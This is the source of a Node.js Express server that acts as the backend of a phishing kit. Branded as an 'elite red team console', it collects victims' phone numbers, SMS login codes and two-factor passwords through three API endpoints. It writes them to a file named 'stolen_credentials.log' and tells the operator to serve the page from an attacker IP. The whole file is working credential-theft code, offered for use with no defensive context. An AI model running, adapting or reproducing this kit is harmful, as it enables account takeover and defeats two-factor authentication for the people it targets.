const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const logFilePath = path.join(__dirname, 'stolen_credentials.log');

// ============================================
// ASCII LOGO – displayed on server start
// ============================================
const logo = `
\x1b[1;32m
███▄ ▄███▓ ▄▄▄       ▄▄▄█████▓ ██▓ ██▒   █▓ ▄▄▄        ██████
▓██▒▀█▀ ██▒▒████▄     ▓  ██▒ ▓▒▓██▒▓██░   █▒▒████▄    ▒██    ▒
▓██    ▓██░▒██  ▀█▄   ▒ ▓██░ ▒░▒██▒ ▓██  █▒░▒██  ▀█▄  ░ ▓██▄
▒██    ▒██ ░██▄▄▄▄██  ░ ▓██▓ ░ ░██░  ▒██ █░░░██▄▄▄▄██   ▒   ██▒
▒██▒   ░██▒ ▓█   ▓██▒   ▒██▒ ░ ░██░   ▒▀█░   ▓█   ▓██▒▒██████▒▒
░ ▒░   ░  ░ ▒▒   ▓▒█░   ▒ ░░   ░▓     ░ ▐░   ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░
░  ░      ░  ▒   ▒▒ ░     ░     ▒ ░   ░ ░░    ▒   ▒▒ ░░ ░▒  ░ ░
░      ░     ░   ▒      ░       ▒ ░     ░░    ░   ▒   ░  ░  ░
       ░         ░  ░           ░        ░        ░  ░      ░
                                        ░

\x1b[0m
`;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function displayLoadingSequence() {
    const lines = [
        '║ [+] Loading modules...',
        '║ [+] Initializing framework...',
        '║ [+] Verifying environment...',
        '║ [+] System ready.'
    ];
    
    console.log('\x1b[1;32m╔══════════════════════════════════════════════════════════════╗');
    console.log('║                  ELITE RED TEAM CONSOLE                     ║');
    console.log('║                     OPERATOR ACCESS                         ║');
    console.log('╠══════════════════════════════════════════════════════════════╣\x1b[0m');
    
    for (const line of lines) {
        console.log('\x1b[1;32m' + line + ' '.repeat(62 - line.length) + '║\x1b[0m');
        await sleep(300);
    }
    
    console.log('\x1b[1;32m╚══════════════════════════════════════════════════════════════╝\x1b[0m');
}

const footer = `
\x1b[1;32m---------------------------------------------------------\n          POWERED BY MASU - CYBER LAB EDITION          \n---------------------------------------------------------\n\x1b[0m
`;
const warning = ``;

function appendLog(line) {
    const timestamp = new Date().toISOString();
    fs.appendFile(logFilePath, `${timestamp} ${line}\n`, (err) => {
        if (err) console.error('Failed to write to stolen_credentials.log:', err);
    });
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoints
app.post('/api/send-code', (req, res) => {
    const { phone, access_key } = req.body;
    const message = `[📞 PHONE] ${phone} | Key: ${access_key}`;
    console.log(`\n${message}`);
    appendLog(message);
    res.json({ ok: true, already_authorized: false });
});

app.post('/api/verify-code', (req, res) => {
    const { phone, code, access_key } = req.body;
    const message = `[🔐 CODE] ${phone} | Code: ${code}`;
    console.log(message);
    appendLog(message);
    res.json({ ok: true, needs_2fa: true });
});

app.post('/api/verify-2fa', (req, res) => {
    const { phone, password, access_key } = req.body;
    const message = `[⚠️ PASSWORD] ${phone} | PW: ${password}`;
    console.log(message);
    appendLog(message);
    res.json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.clear();
    console.log(logo);
    await displayLoadingSequence();
    console.log(`\x1b[32m✓ Server running on http://localhost:${PORT}\x1b[0m`);
    console.log(`\x1b[36m✓ Open the page in your browser at http://<attacker-ip>:${PORT}\x1b[0m\n`);
    console.log(footer);
});
